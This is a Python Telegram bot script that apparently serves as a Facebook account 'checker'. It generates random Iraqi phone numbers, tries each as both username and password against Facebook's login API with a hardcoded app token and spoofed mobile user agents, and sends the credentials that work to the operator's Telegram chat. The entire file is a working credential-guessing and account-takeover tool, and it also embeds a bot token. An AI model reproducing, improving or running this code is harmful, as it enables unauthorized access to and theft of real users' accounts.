import requests
import  random
import sys
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor
import time
# انضر لها وكأنها قمر يدور امامي فتأخذ قلبي وتكسره 
User_Agent=[]

bot = telebot.TeleBot("6766017890:AAE74v_5JlgI-4SfW67UJBNURuEbIgxWhgI")
L7N1 = types.InlineKeyboardButton(text ="Click To Start ⚡",callback_data = "L7N1")
L7N_2 = types.InlineKeyboardButton(text ="Programmer",url="t.me/g_4_q")

@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = f"*Hello* {tag}* To Bot Check Acc Facebook 🐉 !*"
	L7Nbut1 = types.InlineKeyboardMarkup()
	L7Nbut1.add(L7N1)
	L7Nbut1.add(L7N_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=L7Nbut1)

@bot.callback_query_handler(lambda call:True)
def call(call): 
		if call.data == "L7N1":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send Your Name bro :*',parse_mode='Markdown')								
			bot.register_next_step_handler(messag,check,messag.id)						
			rr = random.randint
			andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
			rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
			build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
			vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
			mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
			aa_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			bb_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			cc_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			dd_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ee_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ff_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			gg_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			hh_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ii_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			jj_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			kk_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ll_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			mm_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			nn_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			oo_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			pp_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			Usergen = random.choice([aa_L7N,bb_L7N,cc_L7N,dd_L7N,ee_L7N,ff_L7N,gg_L7N,hh_L7N,ii_L7N,jj_L7N,kk_L7N,ll_L7N,mm_L7N,nn_L7N,oo_L7N,pp_L7N])
			User_Agent.append(Usergen)
			
def check(message,id):
    OK =0
    CP =0
    ERORR=0
    while True:
    	time.sleep(2)
    	g4q = random.choice(User_Agent)
    	Num = random.choice(["0770","0784","0771","0771","0772","0775","0773","0774","0782"])
    	user='1234567890'
    	Num2=''.join(random.choice(user) for i in range(7))
    	password = Num+Num2    	    	    	
    	ids = '+964'+Num+Num2    	
    	if password:
    	   sys.stdout.flush()
    	   data ={"locale": "en_GB","format": "json","email": ids,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
    	   head = {'user-agent': g4q,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
    	   po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
    	   if 'session_key' in po:
    	       OK+=1
    	       bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
@g_4_q  -  @ToPython
    	           	       ''')
    	   elif 'www.facebook.com' in po['error']['message']:
    	   	CP+=1
    	   	bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
@g_4_q  -  @ToPython
    	           	       ''')
    	   else:
    	   	ERORR+=1           	       	   	
    	   	OK_CP_Check_L7N=types.InlineKeyboardButton(text=f"{ids} : {password}", callback_data="L7NL7N")
    	   	OK1 =types.InlineKeyboardButton(text=f"OK : {OK}", callback_data="L7NL7N")
    	   	CP1 =types.InlineKeyboardButton(text=f"CP : {CP}", callback_data="L7NL7N")
    	   	ERORR1 =types.InlineKeyboardButton(text=f"NO : {ERORR}", callback_data="L7NL7N")
    	   	L7Nurl =types.InlineKeyboardButton(text="Programmer 🐉 ", url="t.me/g_4_q")
    	   	L7Nbut2 = types.InlineKeyboardMarkup(row_width=2)
    	   	L7Nbut2 = types.InlineKeyboardMarkup()
    	   	L7Nbut2.add(OK_CP_Check_L7N)
    	   	L7Nbut2.add(OK1)
    	   	L7Nbut2.add(CP1,ERORR1)
    	   	L7Nbut2.add(L7Nurl)
    	   	bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
*Checker Acc is Working Good Luck Bro !*
*By ↝* [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q) 🐉
""",parse_mode="markdown",disable_web_page_preview=True,reply_markup=L7Nbut2)
executor = ThreadPoolExecutor(max_workers=100)
executor.submit(check)

#By ↝L7N 
bot.infinity_polling()
